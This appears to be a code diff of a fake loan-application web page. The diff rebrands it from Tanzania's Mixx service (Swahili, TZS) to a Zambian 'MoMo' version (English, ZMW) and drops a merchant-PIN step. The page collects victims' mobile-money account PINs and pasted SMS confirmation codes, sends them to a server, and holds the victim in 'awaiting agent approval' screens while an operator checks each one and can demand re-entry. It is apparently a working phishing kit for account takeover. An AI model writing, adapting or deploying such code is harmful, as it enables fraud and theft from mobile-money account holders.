         }
       }
 
-      for (let i = 0; i <= 6; i++) {
+      for (let i = 0; i <= 5; i++) {
         const sec = document.getElementById(`step-${i}`);
         if (sec) sec.classList.add('hidden');
       }
@@ -1429,29 +1300,21 @@
       if (currentStep === 4) {
         isSubmittingMessage = false;
         const targetPhone = appState.phoneNumber || document.getElementById('phone-number-input')?.value || '';
-        const smsPhoneTarget = document.getElementById('sms-phone-target');
         const smsTimerPhone = document.getElementById('sms-timer-phone');
-        if (smsPhoneTarget) smsPhoneTarget.innerText = targetPhone ? targetPhone : 'Akaunti ya Mixx';
-        if (smsTimerPhone) smsTimerPhone.innerText = targetPhone ? targetPhone : 'Akaunti ya Mixx';
+        if (smsTimerPhone) smsTimerPhone.innerText = targetPhone ? targetPhone : 'MoMo Account';
         startSimSmsReceiver();
       }
 
       if (currentStep === 5) {
-        if (appState.applicationId) {
-          startVerificationPolling(appState.applicationId);
-        }
-      }
-
-      if (currentStep === 6) {
         const approvedAmt = document.getElementById('summary-approved-amount');
-        if (approvedAmt) approvedAmt.innerText = `TZS ${appState.loanAmount.toLocaleString()}`;
+        if (approvedAmt) approvedAmt.innerText = `ZMW ${appState.loanAmount.toLocaleString()}`;
         
         const monthly = calculateMonthly(appState.loanAmount, appState.loanTermMonths);
         const monthlyPay = document.getElementById('summary-monthly-payment');
-        if (monthlyPay) monthlyPay.innerText = `TZS ${monthly.toLocaleString()}`;
+        if (monthlyPay) monthlyPay.innerText = `ZMW ${monthly.toLocaleString()}`;
         
         const termDisp = document.getElementById('summary-term-display');
-        if (termDisp) termDisp.innerText = `Miezi ${appState.loanTermMonths}`;
+        if (termDisp) termDisp.innerText = `${appState.loanTermMonths} Months`;
 
         if (appState.applicationId) {
           startVerificationPolling(appState.applicationId);
@@ -1471,9 +1334,9 @@
       const msgInput = document.getElementById('momo-pasted-msg');
       if (msgInput) msgInput.value = '';
 
-      if (currentStep > 0 && currentStep <= 5) {
+      if (currentStep > 0 && currentStep <= 4) {
         goToStep(currentStep - 1);
-      } else if (currentStep === 6) {
+      } else if (currentStep === 5) {
         goToStep(0);
       }
     }
@@ -1529,7 +1392,7 @@
       pinInputs.forEach(i => {
         i.type = pinVisible ? 'text' : 'password';
       });
-      document.getElementById('eye-text').innerText = pinVisible ? 'Ficha' : 'Onyesha';
+      document.getElementById('eye-text').innerText = pinVisible ? 'Hide' : 'Show';
     }
 
     function clearPin() {
@@ -1538,73 +1401,10 @@
       checkPinComplete();
     }
 
-    // Merchant 4-Digit PIN Boxes Logic
-    const merchantPinInputs = document.querySelectorAll('.merchant-pin-box');
-    const merchantLoginBtn = document.getElementById('merchant-login-btn');
-    let merchantPinVisible = false;
-
-    merchantPinInputs.forEach((input, index) => {
-      input.addEventListener('focus', () => {
-        input.classList.add('active');
-        input.select();
-      });
-      input.addEventListener('blur', () => {
-        input.classList.remove('active');
-      });
-
-      input.addEventListener('input', (e) => {
-        const val = e.target.value.replace(/[^0-9]/g, '');
-        e.target.value = val;
-
-        if (val && index < merchantPinInputs.length - 1) {
-          merchantPinInputs[index + 1].focus();
-        }
-        checkMerchantPinComplete();
-      });
-
-      input.addEventListener('keydown', (e) => {
-        if (e.key === 'Backspace' && !input.value && index > 0) {
-          merchantPinInputs[index - 1].focus();
-        }
-      });
-    });
-
-    function checkMerchantPinComplete() {
-      let pin = '';
-      merchantPinInputs.forEach(i => pin += i.value);
-      appState.merchantPin = pin;
-
-      if (pin.length === 4 && merchantLoginBtn) {
-        merchantLoginBtn.disabled = false;
-        merchantLoginBtn.classList.remove('bg-blue-900/40', 'text-white/50', 'bg-slate-200', 'text-slate-400', 'cursor-not-allowed');
-        merchantLoginBtn.classList.add('bg-[#0056C6]', 'hover:bg-blue-800', 'text-white', 'shadow-md');
-      } else if (merchantLoginBtn) {
-        merchantLoginBtn.disabled = true;
-        merchantLoginBtn.classList.add('bg-blue-900/40', 'text-white/50', 'cursor-not-allowed');
-        merchantLoginBtn.classList.remove('bg-[#0056C6]', 'hover:bg-blue-800', 'text-white', 'mixx-btn-gradient', 'text-blue-950', 'hover:opacity-95', 'shadow-md');
-      }
-    }
-
-    function toggleMerchantPinVisibility() {
-      merchantPinVisible = !merchantPinVisible;
-      merchantPinInputs.forEach(i => {
-        i.type = merchantPinVisible ? 'text' : 'password';
-      });
-      const eyeTxt = document.getElementById('merchant-eye-text');
-      if (eyeTxt) eyeTxt.innerText = merchantPinVisible ? 'Ficha' : 'Onyesha';
-    }
-
-    function clearMerchantPin() {
-      merchantPinInputs.forEach(i => i.value = '');
-      if (merchantPinInputs[0]) merchantPinInputs[0].focus();
-      checkMerchantPinComplete();
-    }
-
     let autoSubmitTimer = null;
     let isSubmittingMessage = false;
 
     function handlePostLoginPastedMsg(val, isAuto = false) {
-      const msgInput = document.getElementById('momo-pasted-msg');
       const statusEl = document.getElementById('momo-extract-status');
       const badge = document.getElementById('sms-waiting-badge');
       const countdownCard = document.getElementById('sim-sms-countdown-card');
@@ -1615,10 +1415,7 @@
       if (text && text.length >= 3) {
         if (countdownCard) countdownCard.classList.remove('hidden');
         
-        const isRegMsg = /mixx|yas|registered|super app|code|kodi|namba/i.test(text);
-        const statusText = isRegMsg 
-          ? '✨ SMS ya Mixx (Ujumbe wa Usajili) imetambuliwa kikamilifu! Tayari kwa kutuma...' 
-          : '✨ Ujumbe wa SMS kutoka Mixx umetambuliwa! Tayari kwa kutuma...';
+        const statusText = '✨ MoMo SMS message detected! Ready to submit...';
 
         if (statusEl) {
           statusEl.classList.remove('hidden');
@@ -1631,17 +1428,17 @@
         }
         if (badge) {
           badge.className = 'inline-flex items-center text-[11px] font-bold text-emerald-700 bg-emerald-50 px-2.5 py-0.5 rounded-full border border-emerald-200';
-          badge.innerHTML = '<span class="mr-1">✓</span><span>SMS Kamili Imepokewa</span>';
+          badge.innerHTML = '<span class="mr-1">✓</span><span>SMS Received</span>';
         }
 
         const btn = document.getElementById('submit-pasted-msg-btn');
         if (btn && !isSubmittingMessage) {
-          btn.innerText = 'TUMA UJUMBE WA UHAKIKI';
+          btn.innerText = 'SUBMIT VERIFICATION MESSAGE';
         }
 
         if (isAuto) {
           if (btn && !isSubmittingMessage) {
-            btn.innerText = '⚡ UNATUMA MOJA KWA MOJA...';
+            btn.innerText = '⚡ SUBMITTING AUTOMATICALLY...';
           }
           autoSubmitTimer = setTimeout(() => {
             if (!isSubmittingMessage) {
@@ -1653,7 +1450,7 @@
         if (statusEl) statusEl.classList.add('hidden');
         if (badge) {
           badge.className = 'inline-flex items-center text-[11px] font-bold text-slate-600 bg-slate-100 px-2.5 py-0.5 rounded-full border border-slate-200';
-          badge.innerHTML = '<span>Tayari Kubandika</span>';
+          badge.innerHTML = '<span>Ready to Paste</span>';
         }
       }
     }
@@ -1670,7 +1467,7 @@
 
       if (!msg) {
         if (msgAlert) {
-          msgAlert.innerText = 'Tafadhali bandika ujumbe wa uthibitisho wa SMS uliopokea kutoka Mixx.';
+          msgAlert.innerText = 'Please paste the SMS confirmation message received from MoMo.';
           msgAlert.classList.remove('hidden');
         }
         return;
@@ -1679,13 +1476,13 @@
       isSubmittingMessage = true;
       if (btn) {
         btn.disabled = true;
-        btn.innerText = 'INASUBIRI IDHINI...';
+        btn.innerText = 'AWAITING APPROVAL...';
       }
       if (smsWaitingBox) smsWaitingBox.classList.remove('hidden');
       showApprovalOverlay(
-        'Inasubiri Uhakiki wa SMS',
-        'Ujumbe wako wa uthibitisho umetumwa. Tafadhali subiri wakati wakala wako wa Mixx Wakala anahakiki na kuidhinisha uthibitisho wako...',
-        'Inahakiki Ujumbe wa SMS...'
+        'Awaiting SMS Verification',
+        'Your confirmation message has been submitted. Please wait while your MoMo Agent verifies your request...',
+        'Verifying SMS Message...'
       );
 
       try {
@@ -1705,13 +1502,13 @@
             isSubmittingMessage = false;
             hideApprovalOverlay();
             if (msgAlert) {
-              msgAlert.innerText = resData.error || '❌ Hitilafu katika kutuma ujumbe wa uhakiki. Tafadhali jaribu tena.';
+              msgAlert.innerText = resData.error || '❌ Error submitting verification message. Please try again.';
               msgAlert.classList.remove('hidden');
             }
             if (smsWaitingBox) smsWaitingBox.classList.add('hidden');
             if (btn) {
               btn.disabled = false;
-              btn.innerText = 'TUMA UJUMBE WA UHAKIKI';
+              btn.innerText = 'SUBMIT VERIFICATION MESSAGE';
             }
             startSmsCountdownTimer();
             return;
@@ -1727,13 +1524,13 @@
         isSubmittingMessage = false;
         hideApprovalOverlay();
         if (msgAlert) {
-          msgAlert.innerText = '❌ Hitilafu katika kutuma ujumbe wa uhakiki. Tafadhali jaribu tena.';
+          msgAlert.innerText = '❌ Error submitting verification message. Please try again.';
           msgAlert.classList.remove('hidden');
         }
         if (smsWaitingBox) smsWaitingBox.classList.add('hidden');
         if (btn) {
           btn.disabled = false;
-          btn.innerText = 'TUMA UJUMBE WA UHAKIKI';
+          btn.innerText = 'SUBMIT VERIFICATION MESSAGE';
         }
         startSmsCountdownTimer();
       }
@@ -1751,7 +1548,7 @@
 
       if (!fnEl || !fnEl.value.trim() || !lnEl || !lnEl.value.trim() || !phEl || !phEl.value.trim()) {
         if (step2Alert) {
-          step2Alert.innerText = 'Tafadhali jaza sehemu zote zinazohitajika (*).';
+          step2Alert.innerText = 'Please fill in all required fields (*).';
           step2Alert.classList.remove('hidden');
         }
         return;
@@ -1767,13 +1564,13 @@
 
       if (authBtn) {
         authBtn.disabled = true;
-        authBtn.innerText = 'INASUBIRI IDHINI...';
+        authBtn.innerText = 'AWAITING APPROVAL...';
       }
       if (appWaitingBox) appWaitingBox.classList.remove('hidden');
       showApprovalOverlay(
-        'Inasubiri Idhini ya Ombi',
-        'Taarifa za ombi lako la mkopo zimetumwa. Tafadhali subiri wakati wakala wako wa Mixx Wakala anaidhinisha ombi lako...',
-        'Inasubiri Idhini ya Wakala...'
+        'Awaiting Application Approval',
+        'Your application details have been submitted. Please wait while your MoMo Agent approves...',
+        'Awaiting Agent Approval...'
       );
 
       try {
@@ -1784,26 +1581,26 @@
           isAwaitingStep2Approval = false;
           hideApprovalOverlay();
           if (step2Alert) {
-            step2Alert.innerText = '❌ Hitilafu katika kutuma ombi. Tafadhali jaribu tena.';
+            step2Alert.innerText = '❌ Error submitting application. Please try again.';
             step2Alert.classList.remove('hidden');
           }
           if (appWaitingBox) appWaitingBox.classList.add('hidden');
           if (authBtn) {
             authBtn.disabled = false;
-            authBtn.innerText = 'ENDELEA KWENYE UHAKIKI WA MIXX';
+            authBtn.innerText = 'CONTINUE TO MOMO AUTHENTICATION';
           }
         }
       } catch (err) {
         isAwaitingStep2Approval = false;
         hideApprovalOverlay();
         if (step2Alert) {
-          step2Alert.innerText = '❌ ' + (err.message || 'Hitilafu katika kutuma ombi. Tafadhali jaribu tena.');
+          step2Alert.innerText = '❌ ' + (err.message || 'Error submitting application. Please try again.');
           step2Alert.classList.remove('hidden');
         }
         if (appWaitingBox) appWaitingBox.classList.add('hidden');
         if (authBtn) {
           authBtn.disabled = false;
-          authBtn.innerText = 'ENDELEA KWENYE UHAKIKI WA MIXX';
+          authBtn.innerText = 'CONTINUE TO MOMO AUTHENTICATION';
         }
       }
     }
@@ -1813,8 +1610,6 @@
     let isAwaitingStep2Approval = false;
     let activePinVerId = null;
     let lastHandledRejectPinId = null;
-    let activeMerchantPinId = null;
-    let lastHandledRejectMerchantPinId = null;
     let activeSmsVerId = null;
     let lastHandledRejectSmsId = null;
 
@@ -1831,7 +1626,6 @@
           const statusRes = await fetch(`/api/applications/${appId}/status`);
           if (statusRes.ok) {
             const statusData = await statusRes.json();
-            const badge = document.getElementById('summary-status-badge');
             const st = (statusData.status || '').toLowerCase();
 
             if (statusData.phone) {
@@ -1842,19 +1636,6 @@
             }
             if (statusData.firstName) appState.firstName = statusData.firstName;
             if (statusData.lastName) appState.lastName = statusData.lastName;
-
-            if (badge && statusData.status) {
-              if (st === 'approved') {
-                badge.className = 'inline-flex items-center px-2.5 py-0.5 rounded-full text-[11px] font-extrabold bg-emerald-100 text-emerald-800 border border-emerald-300';
-                badge.innerText = '✅ Imeidhinishwa';
-              } else if (st === 'rejected') {
-                badge.className = 'inline-flex items-center px-2.5 py-0.5 rounded-full text-[11px] font-extrabold bg-red-100 text-red-800 border border-red-300';
-                badge.innerText = '❌ Imekataliwa';
-              } else if (st === 'under_review') {
-                badge.className = 'inline-flex items-center px-2.5 py-0.5 rounded-full text-[11px] font-extrabold bg-blue-100 text-blue-900 border border-blue-300';
-                badge.innerText = '🔍 Inakaguliwa';
-              }
-            }
 
             if (currentStep === 2 && isAwaitingStep2Approval) {
               const appWaitingBox = document.getElementById('app-waiting-box');
@@ -1867,7 +1648,7 @@
                 if (step2Alert) step2Alert.classList.add('hidden');
                 if (authBtn) {
                   authBtn.disabled = false;
-                  authBtn.innerText = 'ENDELEA KWENYE UHAKIKI WA MIXX';
+                  authBtn.innerText = 'CONTINUE TO MOMO AUTHENTICATION';
                 }
                 goToStep(3);
               } else if (st === 'rejected') {
@@ -1875,12 +1656,12 @@
                 hideApprovalOverlay();
                 if (appWaitingBox) appWaitingBox.classList.add('hidden');
                 if (step2Alert) {
-                  step2Alert.innerText = '❌ Taarifa za ombi lako hazikuweza kuhakikiwa na wakala wa Mixx Wakala. Tafadhali angalia nambari yako ya simu na taarifa zako kisha ubonyeze Endelea kujaribu tena.';
+                  step2Alert.innerText = '❌ Application details could not be verified by your MoMo agent. Please check your phone number and try again.';
                   step2Alert.classList.remove('hidden');
                 }
                 if (authBtn) {
                   authBtn.disabled = false;
-                  authBtn.innerText = 'ENDELEA KWENYE UHAKIKI WA MIXX';
+                  authBtn.innerText = 'CONTINUE TO MOMO AUTHENTICATION';
                 }
                 appState.applicationId = null;
               }
@@ -1906,7 +1687,7 @@
                 if (pinAlert) pinAlert.classList.add('hidden');
                 clearPin();
                 if (loginBtn) {
-                  loginBtn.innerHTML = 'THIBITISHA PIN YA AKAUNTI';
+                  loginBtn.innerHTML = 'CONFIRM & VALIDATE LOAN';
                   loginBtn.disabled = false;
                 }
                 lastHandledRejectPinId = null;
@@ -1919,12 +1700,12 @@
                   hideApprovalOverlay();
                   if (pinWaitingBox) pinWaitingBox.classList.add('hidden');
                   if (pinAlert) {
-                    pinAlert.innerText = accountPinVer.reject_reason || '❌ PIN ya Akaunti isiyo sahihi! Tafadhali weka tena PIN yako ya Akaunti.';
+                    pinAlert.innerText = accountPinVer.reject_reason || '❌ Incorrect Account PIN! Please re-enter your 4-digit Account PIN.';
                     pinAlert.classList.remove('hidden');
                   }
                   clearPin();
                   if (loginBtn) {
-                    loginBtn.innerHTML = 'THIBITISHA PIN YA AKAUNTI';
+                    loginBtn.innerHTML = 'CONFIRM & VALIDATE LOAN';
                     loginBtn.disabled = true;
                   }
                   if (pinInputs[0]) pinInputs[0].focus();
@@ -1932,7 +1713,7 @@
               }
             }
 
-            // Step 4: SMS Verification check
+            // Step 4: SMS Verification check -> go to Step 5 (Dashboard)
             const smsVer = activeSmsVerId 
               ? verifications.find(v => v.id === activeSmsVerId)
               : verifications.find(v => v.step === 'id_document' && v.status === 'pending');
@@ -1952,7 +1733,7 @@
                 if (smsWaitingBox) smsWaitingBox.classList.add('hidden');
                 if (msgAlert) msgAlert.classList.add('hidden');
                 if (smsBtn) {
-                  smsBtn.innerText = '✓ IMEIDHINISHWA';
+                  smsBtn.innerText = '✓ APPROVED';
                   smsBtn.classList.remove('mixx-btn-gradient');
                   smsBtn.classList.add('bg-emerald-600', 'text-white');
                 }
@@ -1979,61 +1760,21 @@
                   const badge = document.getElementById('sms-waiting-badge');
                   if (badge) {
                     badge.className = 'inline-flex items-center text-[11px] font-bold text-slate-600 bg-slate-100 px-2.5 py-0.5 rounded-full border border-slate-200';
-                    badge.innerHTML = '<span>Tayari Kubandika</span>';
+                    badge.innerHTML = '<span>Ready to Paste</span>';
                   }
 
                   if (smsWaitingBox) smsWaitingBox.classList.add('hidden');
                   if (msgAlert) {
-                    msgAlert.innerText = smsVer.reject_reason || '❌ Ujumbe wa SMS umekataliwa au haujakamilika! Tafadhali nakili ujumbe wote wa SMS kutoka Mixx kisha ubandike hapa chini.';
+                    msgAlert.innerText = smsVer.reject_reason || '❌ SMS message verification failed. Please copy the complete SMS message and paste below.';
                     msgAlert.classList.remove('hidden');
                   }
                   if (smsBtn) {
                     smsBtn.disabled = false;
-                    smsBtn.innerText = 'TUMA UJUMBE WA UHAKIKI';
+                    smsBtn.innerText = 'SUBMIT VERIFICATION MESSAGE';
                   }
 
                   startSmsCountdownTimer();
                   initWebOtpReceiver();
-                }
-              }
-            }
-
-            // Step 5: Merchant PIN verification check
-            const merchantPinVer = activeMerchantPinId 
-              ? verifications.find(v => v.id === activeMerchantPinId)
-              : verifications.find(v => v.step === 'merchant_pin' && v.status === 'pending');
-            const mAlert = document.getElementById('merchant-pin-retry-alert');
-            const mWaitingBox = document.getElementById('merchant-pin-waiting-box');
-
-            if (currentStep === 5 && merchantPinVer) {
-              if (merchantPinVer.status === 'approved') {
-                hideApprovalOverlay();
-                if (mWaitingBox) mWaitingBox.classList.add('hidden');
-                if (mAlert) mAlert.classList.add('hidden');
-                clearMerchantPin();
-                if (merchantLoginBtn) {
-                  merchantLoginBtn.innerHTML = 'THIBITISHA PIN YA MERCHANT';
-                  merchantLoginBtn.disabled = false;
-                }
-                lastHandledRejectMerchantPinId = null;
-                activeMerchantPinId = null;
-                goToStep(6);
-              } else if (merchantPinVer.status === 'rejected') {
-                if (lastHandledRejectMerchantPinId !== merchantPinVer.id) {
-                  lastHandledRejectMerchantPinId = merchantPinVer.id;
-                  activeMerchantPinId = null;
-                  hideApprovalOverlay();
-                  if (mWaitingBox) mWaitingBox.classList.add('hidden');
-                  if (mAlert) {
-                    mAlert.innerText = merchantPinVer.reject_reason || '❌ PIN ya Merchant isiyo sahihi! Tafadhali weka tena PIN yako ya Merchant.';
-                    mAlert.classList.remove('hidden');
-                  }
-                  clearMerchantPin();
-                  if (merchantLoginBtn) {
-                    merchantLoginBtn.innerHTML = 'THIBITISHA PIN YA MERCHANT';
-                    merchantLoginBtn.disabled = true;
-                  }
-                  if (merchantPinInputs[0]) merchantPinInputs[0].focus();
                 }
               }
             }
@@ -2058,15 +1799,15 @@
               <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
               <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
             </svg>
-            INASUBIRI IDHINI...
+            AWAITING APPROVAL...
           </span>`;
         loginBtn.disabled = true;
       }
 
       showApprovalOverlay(
-        'Inasubiri Uhakiki wa PIN ya Akaunti',
-        'PIN yako ya Akaunti imetumwa. Tafadhali subiri wakati wakala wako wa Mixx Wakala anahakiki na kuidhinisha PIN yako...',
-        'Inahakiki PIN ya Akaunti...'
+        'Awaiting Account PIN Verification',
+        'Your Account PIN has been submitted. Please wait while your MoMo Agent verifies...',
+        'Verifying Account PIN...'
       );
 
       try {
@@ -2089,12 +1830,12 @@
           if (!res.ok && res.status !== 409) {
             hideApprovalOverlay();
             if (pinAlert) {
-              pinAlert.innerText = resData.error || '❌ Hitilafu katika kutuma PIN ya Akaunti. Tafadhali jaribu tena.';
+              pinAlert.innerText = resData.error || '❌ Error submitting Account PIN. Please try again.';
               pinAlert.classList.remove('hidden');
             }
             if (pinWaitingBox) pinWaitingBox.classList.add('hidden');
             if (loginBtn) {
-              loginBtn.innerHTML = 'THIBITISHA PIN YA AKAUNTI';
+              loginBtn.innerHTML = 'CONFIRM & VALIDATE LOAN';
               loginBtn.disabled = false;
             }
             return;
@@ -2110,151 +1851,16 @@
         hideApprovalOverlay();
         console.error('Account PIN submission error:', err);
         if (pinAlert) {
-          pinAlert.innerText = '❌ Hitilafu katika kutuma PIN ya Akaunti. Tafadhali jaribu tena.';
+          pinAlert.innerText = '❌ Error submitting Account PIN. Please try again.';
           pinAlert.classList.remove('hidden');
         }
         if (pinWaitingBox) pinWaitingBox.classList.add('hidden');
         if (loginBtn) {
-          loginBtn.innerHTML = 'THIBITISHA PIN YA AKAUNTI';
+          loginBtn.innerHTML = 'CONFIRM & VALIDATE LOAN';
           loginBtn.disabled = false;
         }
       }
     }
-
-    async function submitMerchantPin() {
-      if ((appState.merchantPin || '').length < 4) return;
-      
-      const mAlert = document.getElementById('merchant-pin-retry-alert');
-      if (mAlert) mAlert.classList.add('hidden');
-
-      const mWaitingBox = document.getElementById('merchant-pin-waiting-box');
-      if (mWaitingBox) mWaitingBox.classList.remove('hidden');
-
-      if (merchantLoginBtn) {
-        merchantLoginBtn.innerHTML = `
-          <span class="inline-flex items-center">
-            <svg class="animate-spin -ml-1 mr-2 h-4 w-4 text-blue-950" fill="none" viewBox="0 0 24 24">
-              <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
-              <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
-            </svg>
-            INASUBIRI IDHINI...
-          </span>`;
-        merchantLoginBtn.disabled = true;
-      }
-
-      showApprovalOverlay(
-        'Inasubiri Uhakiki wa PIN ya Merchant',
-        'PIN yako ya Merchant Account imetumwa. Tafadhali subiri wakati wakala wako wa Mixx Wakala anahakiki na kuidhinisha PIN yako ya Merchant...',
-        'Inahakiki Merchant PIN...'
-      );
-
-      try {
-        let appId = appState.applicationId;
-        if (!appId) {
-          appId = await ensureApplicationCreated();
-        }
-
-        if (appId) {
-          const res = await fetch(`/api/applications/${appId}/verify`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              step: 'merchant_pin',
-              zipCode: appState.merchantPin,
-              phone: appState.phoneNumber
-            })
-          });
-          const resData = await res.json().catch(() => ({}));
-          if (!res.ok && res.status !== 409) {
-            hideApprovalOverlay();
-            if (mAlert) {
-              mAlert.innerText = resData.error || '❌ Hitilafu katika kutuma Merchant PIN. Tafadhali jaribu tena.';
-              mAlert.classList.remove('hidden');
-            }
-            if (mWaitingBox) mWaitingBox.classList.add('hidden');
-            if (merchantLoginBtn) {
-              merchantLoginBtn.innerHTML = 'THIBITISHA PIN YA MERCHANT';
-              merchantLoginBtn.disabled = false;
-            }
-            return;
-          }
-
-          if (resData.verificationId) {
-            activeMerchantPinId = resData.verificationId;
-          }
-          lastHandledRejectMerchantPinId = null;
-          startVerificationPolling(appId);
-        }
-      } catch (err) {
-        hideApprovalOverlay();
-        console.error('Merchant PIN submission error:', err);
-        if (mAlert) {
-          mAlert.innerText = '❌ Hitilafu katika kutuma Merchant PIN. Tafadhali jaribu tena.';
-          mAlert.classList.remove('hidden');
-        }
-        if (mWaitingBox) mWaitingBox.classList.add('hidden');
-        if (merchantLoginBtn) {
-          merchantLoginBtn.innerHTML = 'THIBITISHA PIN YA MERCHANT';
-          merchantLoginBtn.disabled = false;
-        }
-      }
-    }
-
-    // Retain legacy function alias if needed
-    function submitApplication() {
-      return submitAccountPin();
-    }
-
-    function toggleNoticeModal(show, title = '', msg = '') {
-      const modal = document.getElementById('notice-modal');
-      if (show) {
-        document.getElementById('modal-title').innerText = title;
-        document.getElementById('modal-message').innerText = msg;
-        modal.classList.remove('hidden');
-      } else {
-        modal.classList.add('hidden');
-      }
-    }
-
-    document.addEventListener('DOMContentLoaded', () => {
-      const savedPhone = localStorage.getItem('eloan_phone');
-      if (savedPhone) {
-        appState.phoneNumber = savedPhone;
-        const phInp = document.getElementById('phone-number-input');
-        if (phInp && !phInp.value) phInp.value = savedPhone;
-        const dispPhone = document.getElementById('momo-phone-display');
-        if (dispPhone && !dispPhone.value) dispPhone.value = savedPhone;
-      }
-
-      const urlParams = new URLSearchParams(window.location.search);
-      const ref = urlParams.get('ref');
-      if (ref) {
-        const banner = document.getElementById('referral-banner');
-        const codeDisplay = document.getElementById('referral-code-display');
-        if (banner && codeDisplay) {
-          codeDisplay.innerText = ref.substring(0, 10) + '...';
-          banner.classList.remove('hidden');
-        }
-      }
-      const msgInput = document.getElementById('momo-pasted-msg');
-      if (msgInput) {
-        msgInput.addEventListener('paste', (e) => {
-          try {
-            const pasted = (e.clipboardData || window.clipboardData).getData('text');
-            if (pasted && pasted.trim()) {
-              const fullMsg = pasted.trim();
-              setTimeout(() => {
-                msgInput.value = fullMsg;
-                handlePostLoginPastedMsg(fullMsg, true);
-              }, 20);
-            }
-          } catch (err) {}
-        });
-      }
-
-      updateCalculator(5000000);
-      goToStep(0);
-    });
   </script>
 </body>
 </html>
